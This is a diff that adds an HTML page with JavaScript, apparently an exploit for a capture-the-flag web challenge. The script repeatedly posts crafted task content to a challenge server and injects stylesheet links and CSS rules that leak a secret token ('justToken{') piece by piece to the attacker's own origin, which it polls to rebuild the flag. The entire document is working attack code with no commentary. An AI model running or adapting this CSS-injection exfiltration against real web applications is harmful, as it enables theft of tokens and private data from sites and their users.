@@ -1,0 +1,30 @@
+<form target="chall" id="form" method="POST">
+  <textarea name="content"></textarea>
+</form>
+<script>
+  const sleep = d => new Promise(r=>setTimeout(r,d));
+
+  const CHALL_URL = 'http://localhost:80';
+  const containerTpl = flag => `,\n${flag}</pre>\n        </td>\n      </tr>\n      \n  </table>\n\n  <form method=\"POST\" action=\"/tasks/create\">\n    <button class=\"btn\" type=\"submit\">Create New Task</button>\n  </form>\n\n</body>\n\n</html>`;
+
+  const form = document.querySelector('#form');
+  form.action = `${CHALL_URL}/tasks/0`;
+  let flag = 'justToken{';
+
+  window.onload = async () => {
+    for(let i=0; i<50; i++){
+      const prev = `<link rel=stylesheet href=/tasks><link rel=stylesheet href=${window.origin}/css/${flag}>}`;
+      const task = `${prev}${'a'.repeat(500 - flag.length - 12 - prev.length)}{}*{--x:`;
+      form.content.value = task;
+      form.submit();
+      await sleep(1000);
+      open(`${CHALL_URL}/tasks/preview/0/0`, 'prev');
+      flag = await fetch('/poll').then(e=>e.text());
+      console.log(flag);
+      open(`${CHALL_URL}/tasks/delete/0/0`, 'prev');
+      await sleep(1000);
+    }
+    
+  }
+
+</script>
